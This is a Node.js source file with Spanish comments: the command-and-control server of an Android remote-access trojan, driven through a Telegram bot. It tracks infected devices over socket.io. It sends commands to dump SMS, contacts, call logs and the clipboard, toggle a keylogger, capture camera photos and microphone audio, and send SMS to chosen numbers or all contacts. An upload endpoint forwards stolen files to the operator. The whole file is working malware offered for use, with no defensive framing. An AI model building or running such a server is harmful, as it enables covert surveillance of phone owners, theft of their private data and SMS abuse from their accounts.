const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf } = require('telegraf');
const multer = require('multer');

// Variables de configuración al inicio
const TOKEN = "";
const OWNER_ID = "";

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const bot = new Telegraf(TOKEN);

// Gestión de múltiples dispositivos
const devices = new Map(); // socket.id -> { model, version, ip }
let selectedDeviceId = null;

// Multer para recibir archivos en memoria (no guardarlos localmente)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Middleware de seguridad para el bot de Telegram
const authMiddleware = (ctx, next) => {
    if (ctx.from && ctx.from.id.toString() === OWNER_ID) {
        return next();
    }
    return ctx.reply("Acceso denegado. No eres el OWNER_ID.");
};

// Comandos de Telegram
bot.start(authMiddleware, (ctx) => {
    ctx.reply("🔥 Servidor de control iniciado.\nUsa /list para ver los dispositivos conectados.");
});

bot.command('list', authMiddleware, (ctx) => {
    if (devices.size === 0) {
        return ctx.reply("❌ No hay dispositivos conectados.");
    }
    let message = "📱 Dispositivos conectados:\n\n";
    const deviceList = Array.from(devices.entries());
    deviceList.forEach(([id, info], index) => {
        message += `[${index}] ${info.model} (v${info.version}, IP: ${info.ip})\n`;
    });
    ctx.reply(message);
});

bot.command('select', authMiddleware, (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("⚠️ Uso: /select [indice]");

    const index = parseInt(args[1]);
    const deviceList = Array.from(devices.entries());

    if (index >= 0 && index < deviceList.length) {
        selectedDeviceId = deviceList[index][0];
        const info = deviceList[index][1];
        ctx.reply(`✅ Dispositivo seleccionado: ${info.model}`);
    } else {
        ctx.reply("❌ Índice inválido.");
    }
});

// Función para enviar comandos al dispositivo seleccionado
const sendCommand = (ctx, request, extras = []) => {
    if (!selectedDeviceId || !devices.has(selectedDeviceId)) {
        return ctx.reply("❌ Error: No hay ningún dispositivo seleccionado o el seleccionado se desconectó.");
    }

    const payload = {
        request: request,
        extras: extras
    };

    io.to(selectedDeviceId).emit('commend', payload);
    ctx.reply(`🚀 Comando '${request}' enviado a ${devices.get(selectedDeviceId).model}`);
};

// Mapeo de comandos simples (sin parámetros adicionales)
const simpleCommands = [
    { cmd: 'clipboard', req: 'clipboard' },
    { cmd: 'all_sms', req: 'all-sms' },
    { cmd: 'contacts', req: 'contacts' },
    { cmd: 'apps', req: 'apps' },
    { cmd: 'keylogger_on', req: 'keylogger-on' },
    { cmd: 'keylogger_off', req: 'keylogger-off' },
    { cmd: 'calls', req: 'calls' },
    { cmd: 'selfie_camera', req: 'selfie-camera' },
    { cmd: 'main_camera', req: 'main-camera' }
];

simpleCommands.forEach(c => {
    bot.command(c.cmd, authMiddleware, (ctx) => sendCommand(ctx, c.req));
});

// Comandos con parámetros
bot.command('pop_notification', authMiddleware, (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply("⚠️ Uso: /pop_notification [texto]");
    sendCommand(ctx, 'popNotification', [{ key: 'text', value: text }]);
});

bot.command('toast', authMiddleware, (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply("⚠️ Uso: /toast [texto]");
    sendCommand(ctx, 'toast', [{ key: 'text', value: text }]);
});

bot.command('sms_to_all_contacts', authMiddleware, (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply("⚠️ Uso: /sms_to_all_contacts [texto]");
    sendCommand(ctx, 'smsToAllContacts', [{ key: 'text', value: text }]);
});

bot.command('vibrate', authMiddleware, (ctx) => {
    const duration = ctx.message.text.split(' ')[1] || "2000";
    sendCommand(ctx, 'vibrate', [{ key: 'duration', value: duration }]);
});

bot.command('microphone', authMiddleware, (ctx) => {
    const duration = ctx.message.text.split(' ')[1] || "5000";
    sendCommand(ctx, 'microphone', [{ key: 'duration', value: duration }]);
});

bot.command('send_sms', authMiddleware, (ctx) => {
    const parts = ctx.message.text.split(' ');
    if (parts.length < 3) return ctx.reply("⚠️ Uso: /send_sms [numero] [texto]");
    const number = parts[1];
    const text = parts.slice(2).join(' ');
    sendCommand(ctx, 'sendSms', [{ key: 'number', value: number }, { key: 'text', value: text }]);
});

// Eventos de Socket.io
io.on('connection', (socket) => {
    // Al conectar, intentamos obtener info de los parámetros de conexión
    const { model, version, ip } = socket.handshake.query;

    if (model && version && ip) {
        devices.set(socket.id, { model, version, ip });
        console.log(`[+] Dispositivo conectado: ${model} (${socket.id})`);
        if (OWNER_ID) bot.telegram.sendMessage(OWNER_ID, `🆕 Dispositivo conectado: ${model}`);
    }

    // Escuchar "message" de la app y reenviar al OWNER_ID
    socket.on('message', (text) => {
        if (OWNER_ID) {
            const dev = devices.get(socket.id);
            const prefix = dev ? `[${dev.model}] ` : '';
            bot.telegram.sendMessage(OWNER_ID, `${prefix}Mensaje recibido: ${text}`);
        }
    });

    socket.on('disconnect', () => {
        const info = devices.get(socket.id);
        if (info) {
            console.log(`[-] Dispositivo desconectado: ${info.model}`);
            devices.delete(socket.id);
            if (selectedDeviceId === socket.id) {
                selectedDeviceId = null;
            }
        }
    });
});

// Endpoint HTTP POST /upload/
app.post('/upload/', upload.single('file'), (req, res) => {
    const model = req.headers['model'] || 'Desconocido';
    const file = req.file;

    if (!file || !OWNER_ID) {
        return res.status(400).send('Error: No se recibió archivo o OWNER_ID no configurado.');
    }

    const caption = `📁 Archivo recibido de ${model}`;
    const filename = file.originalname || 'archivo';
    const extension = filename.split('.').pop().toLowerCase();
    const photoExtensions = ['jpg', 'jpeg', 'png', 'gif'];

    const sendMethod = photoExtensions.includes(extension)
        ? bot.telegram.sendPhoto.bind(bot.telegram)
        : bot.telegram.sendDocument.bind(bot.telegram);

    const extra = photoExtensions.includes(extension) ? { caption } : { caption, filename };

    sendMethod(OWNER_ID, { source: file.buffer }, extra)
        .then(() => {
            console.log(`[UP] Archivo enviado a Telegram de: ${model}`);
            res.status(200).send('OK');
        })
        .catch(err => {
            console.error('[UP] Error enviando a Telegram:', err);
            res.status(500).send(err.message);
        });
});

// Iniciar el servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Servidor escuchando en http://localhost:${PORT}`);
    bot.launch().then(() => console.log('🤖 Bot de Telegram iniciado'));
});

// Manejo básico de errores
process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason);
});
